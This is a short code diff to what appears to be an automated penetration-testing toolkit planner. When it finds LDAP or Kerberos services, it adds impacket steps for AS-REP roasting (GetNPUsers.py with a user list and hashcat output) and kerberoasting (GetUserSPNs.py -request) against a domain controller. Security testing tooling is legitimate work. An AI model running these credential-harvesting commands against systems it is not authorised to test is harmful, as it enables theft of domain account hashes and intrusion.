@@ -159,6 +159,31 @@ class ToolkitPlan:
                 }
             )
 
+        # Active Directory / Kerberos: AS-REP roasting + kerberoasting (impacket)
+        if _has("ldap", req.services) or _has("kerberos-sec", req.services):
+            runs.append(
+                {
+                    "tool": "GetNPUsers",
+                    "argv": [
+                        "GetNPUsers.py",
+                        "-dc-ip",
+                        host,
+                        "-usersfile",
+                        "/opt/h4k/data/users.txt",
+                        "-no-pass",
+                        "-format",
+                        "hashcat",
+                        ".",
+                    ],
+                }
+            )
+            runs.append(
+                {
+                    "tool": "GetUserSPNs",
+                    "argv": ["GetUserSPNs.py", "-dc-ip", host, ".", "-request"],
+                }
+            )
+
         # WordPress scan (fast on non-WP too; harmless)
         if _has("http", req.services):
             runs.append(
